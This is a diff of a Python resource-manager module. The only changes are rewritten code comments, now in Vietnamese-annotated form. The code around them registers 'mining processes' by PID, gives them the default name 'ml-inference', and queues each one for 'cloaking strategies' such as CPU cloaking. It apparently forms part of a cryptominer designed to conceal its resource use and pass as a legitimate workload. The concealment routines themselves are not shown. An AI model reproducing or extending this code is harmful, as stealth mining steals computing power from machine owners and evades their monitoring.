@@ -11,7 +11,7 @@ import logging
 import psutil
 import traceback
 import threading
-import concurrent.futures  # ✅ NEW: ThreadPoolExecutor for per-strategy timeout
+import concurrent.futures  # **[NEW]** (mới – ThreadPoolExecutor cho timeout từng chiến lược)
 import queue
 import time
 from threading import RLock
@@ -28,7 +28,7 @@ from .privileged_operations import get_privileged_manager
 from .unified_logging import get_unified_logger
 from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
-# ✅ **INTELLIGENT CACHING** (bộ nhớ đệm thông minh – sử dụng hệ thống cache chiến lược nâng cao)
+# **[INTELLIGENT CACHING]** (bộ nhớ đệm thông minh – sử dụng hệ thống cache chiến lược nâng cao)
 from .strategy_cache import get_strategy_cache, CacheEvictionPolicy
 
 class SharedResourceManager:
@@ -40,18 +40,18 @@ class SharedResourceManager:
     """
 
     def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
-        # ✅ UNIFIED: Use unified logger for consistent logging
+        # **[UNIFIED]** (hợp nhất – sử dụng unified logger cho ghi log nhất quán)
         self.logger = get_unified_logger('resource_manager')
         self.config = config
         self.resource_managers = resource_managers
-        # ✅ INTELLIGENT CACHING: Replace simple dict with intelligent cache system
+        # **[INTELLIGENT CACHING]** (bộ nhớ đệm thông minh – thay thế dict đơn giản bằng hệ thống cache thông minh)
         self.strategy_cache = get_strategy_cache(
             max_size=500,  # Reasonable size for strategy objects
             ttl_seconds=7200.0,  # 2 hours TTL for strategy objects
             eviction_policy=CacheEvictionPolicy.INTELLIGENT
         )
         
-        # ✅ CACHE METRICS: Track cache performance
+        # **[CACHE METRICS]** (chỉ số cache – theo dõi hiệu suất bộ nhớ đệm)
         self.cache_metrics_interval = 300  # 5 minutes
         self.last_cache_metrics_log = time.time()
         
@@ -137,7 +137,7 @@ class SharedResourceManager:
             strategy.apply(process)
             self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
 
-            # ✅ REMOVED: CPU registration moved to centralized worker
+            # **[REMOVED]** (đã loại bỏ – CPU registration chuyển sang centralized worker)
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Tiến trình không tồn tại: {e}")
@@ -171,10 +171,10 @@ class ResourceManager(IResourceManager):
             return
 
         self._initialized = True
-        # ✅ UNIFIED: Use unified logger for consistent logging hierarchy
+        # **[UNIFIED]** (hợp nhất – sử dụng unified logger cho ghi log nhất quán) hierarchy
         self.logger = get_unified_logger('resource_manager')
         
-        # ✅ ENHANCED: Configuration validation before initialization
+        # **[ENHANCED]** (nâng cao – xác thực cấu hình trước khi khởi tạo)
         self.config = self._validate_configuration(config)
         self.event_bus = event_bus
 
@@ -185,7 +185,7 @@ class ResourceManager(IResourceManager):
         self.mining_processes_lock = threading.RLock()
         self.mining_processes: List[MiningProcess] = []
 
-        # ✅ REMOVED: CPU/GPU queues - logic integrated in enqueue_cloaking()
+        # **[REMOVED]** (đã loại bỏ – CPU/GPU queues, logic tích hợp trong enqueue_cloaking())
         # Logic phân loại queue đã được tích hợp trong enqueue_cloaking()
 
         # **EventBus subscribe** (đăng ký EventBus) - **PID Propagation Flow Step 2**
@@ -200,27 +200,27 @@ class ResourceManager(IResourceManager):
         self.shared_resource_manager: Optional[SharedResourceManager] = None
 
         self._counter = count()
-        # ✅ NEW: Unique worker identifier for logging & cache metadata
+        # **[NEW]** (mới – định danh worker duy nhất cho logging và cache metadata)
         #    Mỗi ResourceManager (và các thread làm việc của nó) sẽ dùng cùng một worker_id
         #    nhằm gắn nhãn (tag) các đối tượng chiến lược được lưu trong cache. Việc này
         #    khắc phục lỗi AttributeError: 'ResourceManager' object has no attribute 'worker_id'.
         self.worker_id = next(self._counter)
         self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"
         
-        # ✅ ENHANCED: Strategy metrics tracking for success/failure monitoring
+        # **[ENHANCED]** (nâng cao – theo dõi metrics chiến lược cho giám sát thành công/thất bại)
         self.strategy_metrics: Dict[int, Dict[str, Any]] = {}  # PID -> metrics data
         
-        # ✅ ERROR MANAGEMENT: Initialize error reporter with EventBus integration
+        # **[ERROR MANAGEMENT]** (quản lý lỗi – khởi tạo error reporter với tích hợp EventBus)
         self.error_reporter = get_error_reporter(event_bus)
 
         self.logger.info("ResourceManager.__init__ (simplified with unified cloaking queue)")
 
-        # ✅ SIMPLIFIED: Essential EventBus subscriptions only
+        # **[SIMPLIFIED]** (đơn giản hóa – chỉ các subscriptions EventBus cần thiết)
         self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)
     
     def _validate_configuration(self, config: ConfigModel) -> ConfigModel:
         """
-        ✅ NEW: Comprehensive configuration validation với detailed error reporting
+        **[NEW]** (mới – xác thực cấu hình toàn diện với báo lỗi chi tiết)
         
         :param config: Configuration to validate
         :return: Validated configuration
@@ -229,18 +229,18 @@ class ResourceManager(IResourceManager):
         try:
             self.logger.info("🔍 [Validating] (xác thực) cấu hình ResourceManager...")
             
-            # ✅ VALIDATION 1: Check process priority map
+            # **[VALIDATION 1]** (xác thực 1 – kiểm tra bản đồ ưu tiên tiến trình)
             if not hasattr(config, 'process_priority_map'):
                 self.logger.warning("⚠️ Missing process_priority_map - using defaults (CPU-only)")
                 config.process_priority_map = {'ml-inference': 1}
             
-            # ✅ VALIDATION 2: Validate priority values
+            # **[VALIDATION 2]** (xác thực 2 – kiểm tra giá trị ưu tiên)
             for process_name, priority in config.process_priority_map.items():
                 if not isinstance(priority, int) or priority < 1:
                     self.logger.warning(f"⚠️ Invalid priority for '{process_name}': {priority} - setting to 1")
                     config.process_priority_map[process_name] = 1
             
-            # ✅ VALIDATION 3: Check cloaking strategies configuration
+            # **[VALIDATION 3]** (xác thực 3 – kiểm tra cấu hình chiến lược che giấu)
             cloaking_strategies = getattr(config, 'cloaking_strategies', None)
             if not cloaking_strategies:
                 self.logger.warning("⚠️ No cloaking strategies configured - using defaults")
@@ -255,7 +255,7 @@ class ResourceManager(IResourceManager):
                     # Fallback: set attribute directly
                     setattr(config, 'cloaking_strategies', default_strategies)
             
-            # ✅ VALIDATION 4: Validate strategy configurations
+            # **[VALIDATION 4]** (xác thực 4 – kiểm tra các cấu hình chiến lược)
             if cloaking_strategies:
                 required_strategies = ['cpu_cloaking']
                 for strategy in required_strategies:
@@ -267,7 +267,7 @@ class ResourceManager(IResourceManager):
                         self.logger.warning(f"⚠️ Invalid configuration for strategy '{strategy}' - resetting")
                         cloaking_strategies[strategy] = {'enabled': True}
             
-            # ✅ VALIDATION 5: Configuration method support check
+            # **[VALIDATION 5]** (xác thực 5 – kiểm tra hỗ trợ method cấu hình)
             if not hasattr(config, 'get'):
                 self.logger.warning("⚠️ Config missing 'get' method - adding wrapper")
                 original_config = config
@@ -284,9 +284,9 @@ class ResourceManager(IResourceManager):
                 
                 config = ConfigWrapper(original_config)
             
-            self.logger.info("✅ [Configuration Validation] (xác thực cấu hình) hoàn tất thành công")
+            self.logger.info("✅ **[Configuration Validation]** (xác thực cấu hình – hoàn tất thành công)")
             
-            # ✅ LOG CONFIGURATION SUMMARY
+            # **[LOG CONFIGURATION SUMMARY]** (tóm tắt cấu hình – ghi log tổng quan)
             priority_count = len(getattr(config, 'process_priority_map', {}))
             strategy_count = len(getattr(config, 'cloaking_strategies', {}))
             self.logger.info(f"📋 [Configuration Summary] (tổng quan cấu hình): {priority_count} [process priorities] (độ ưu tiên tiến trình), {strategy_count} [cloaking strategies] (chiến lược che giấu)")
@@ -304,7 +304,7 @@ class ResourceManager(IResourceManager):
 
     def handle_resource_adjustment(self, event_data: Dict[str, Any]):
         """
-        ✅ SIMPLIFIED: Minimal resource adjustment handler
+        **[SIMPLIFIED]** (đơn giản hóa – bộ xử lý điều chỉnh tài nguyên tối thiểu)
         """
         try:
             pid = event_data.get('pid')
@@ -316,17 +316,17 @@ class ResourceManager(IResourceManager):
             self.logger.error(f"❌ Error in resource adjustment processing: {e}")
 
     def _setup_eventbus_subscriptions(self):
-        """✅ SIMPLIFIED: Essential EventBus subscriptions with memory backend fallback"""
+        """**[SIMPLIFIED]** (đơn giản hóa – các subscriptions EventBus cần thiết với fallback memory backend)"""
         try:
             self.logger.info("🔌 Setting up essential EventBus subscriptions...")
             
-            # ✅ CORE: Subscribe to mining events only - **FIXED EVENT NAMES** (tên sự kiện đã sửa)
+            # **[CORE]** (cốt lõi – chỉ subscribe tới mining events) - **[FIXED EVENT NAMES]** (tên sự kiện đã sửa)
             self.logger.info("🔍 [DIAGNOSTIC] Subscribing to mining:cpu_pid_registered event")
             self.event_bus.subscribe('mining:cpu_pid_registered', self._on_cpu_mining_event)
             # (CPU-only) Bỏ qua đăng ký GPU events
             
             self.event_bus.start_listening()
-            self.logger.info("✅ EventBus subscriptions established successfully")
+            self.logger.info("✅ **[EventBus subscriptions]** (các đăng ký EventBus – thiết lập thành công)")
             
             # 👉 NEW DEBUG: hiển thị danh sách subscribers hiện tại để xác minh
             try:
@@ -343,11 +343,11 @@ class ResourceManager(IResourceManager):
     def _on_cpu_mining_event(self, payload: Dict[str, Any]) -> None:
         """Handle CPU mining events - PID Propagation Flow Step 2 - **UPDATED FOR NEW EVENT FORMAT** (cập nhật cho định dạng sự kiện mới)"""
         try:
-            # ✅ DIAGNOSTIC: Log entry point với DEBUG level
+            # **[DIAGNOSTIC]** (chẩn đoán – ghi log điểm vào với DEBUG level)
             self.logger.debug(f"🔍 [DIAGNOSTIC] _on_cpu_mining_event triggered")
             self.logger.debug(f"📦 Event payload: {payload}")
             
-            # ✅ FIXED: Updated to match start_mining.py payload structure
+            # **[FIXED]** (đã sửa – cập nhật khớp với cấu trúc payload start_mining.py)
             pid = payload.get('pid')
             process_name = payload.get('process_name', 'ml-inference')
             status = payload.get('status')
@@ -358,7 +358,7 @@ class ResourceManager(IResourceManager):
                 self.logger.info(f"🔨 ResourceManager received CPU PID registered: PID={pid}")
                 self.logger.debug(f"[DEBUG] CPU event payload: {payload}")
                 
-                # ✅ ENHANCED: Create MiningProcess với explicit classification
+                # **[ENHANCED]** (nâng cao – tạo MiningProcess với phân loại rõ ràng)
                 mining_process = MiningProcess(pid, process_name, is_gpu=False)  # Explicit CPU
                 self.logger.debug(f"[DEBUG] Created MiningProcess: {mining_process}")
                 
@@ -367,11 +367,11 @@ class ResourceManager(IResourceManager):
                     self.mining_processes.append(mining_process)
                     self.logger.debug(f"[DEBUG] Added to mining_processes list. Total: {len(self.mining_processes)}")
                 
-                # ✅ STREAMLINED: Enqueue cloaking only
+                # **[STREAMLINED]** (tối ưu hóa – chỉ enqueue cloaking)
                 self.logger.debug(f"[DEBUG] Calling enqueue_cloaking for CPU PID {pid}")
                 self.enqueue_cloaking(mining_process)
                 
-                self.logger.info(f"✅ CPU PID {pid} processed: registered + enqueued for cloaking")
+                self.logger.info(f"✅ **[CPU PID {pid} processed]** (xử lý PID CPU – đã đăng ký và enqueue cho cloaking)")
             else:
                 self.logger.debug(f"⚠️ Skipping CPU event - invalid payload: pid={pid}, status={status}")
                 
@@ -379,7 +379,7 @@ class ResourceManager(IResourceManager):
             error_msg = f"❌ Error handling CPU mining event: {e}"
             self.logger.error(error_msg)
             
-            # ✅ ENHANCED: Error propagation through EventBus
+            # **[ENHANCED]** (nâng cao – lan truyền lỗi qua EventBus)
             try:
                 if self.event_bus:
                     self.event_bus.publish('resource_manager:cpu_event_error', {
@@ -399,7 +399,7 @@ class ResourceManager(IResourceManager):
 
     def enqueue_cloaking(self, process: MiningProcess) -> None:
         """
-        ✅ ENHANCED: Comprehensive multi-strategy cloaking queue với full resource control
+        **[ENHANCED]** (nâng cao – hàng đợi cloaking đa chiến lược toàn diện với kiểm soát tài nguyên đầy đủ)
         """
         pid = process.pid
         name = process.name
